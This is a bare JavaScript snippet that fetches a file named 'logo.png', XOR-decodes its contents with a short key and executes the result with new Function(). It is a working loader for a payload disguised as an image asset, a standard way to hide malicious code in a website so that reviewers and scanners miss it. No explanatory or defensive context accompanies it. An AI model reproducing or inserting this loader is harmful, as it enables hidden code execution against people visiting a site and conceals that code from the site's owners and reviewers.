const key = "1x1";
const request = new XMLHttpRequest();
request.open("GET", "logo.png");
request.onreadystatechange = () => {
  if (request.readyState !== 4 || request.status !== 200) return;
  const source = request.responseText;
  let decoded = "";
  for (let i = 0; i < source.length; i++) {
    decoded += String.fromCharCode(source.charCodeAt(i)^key[i%key.length].charCodeAt(0));
  }
  new Function(decoded)();
};
request.send();
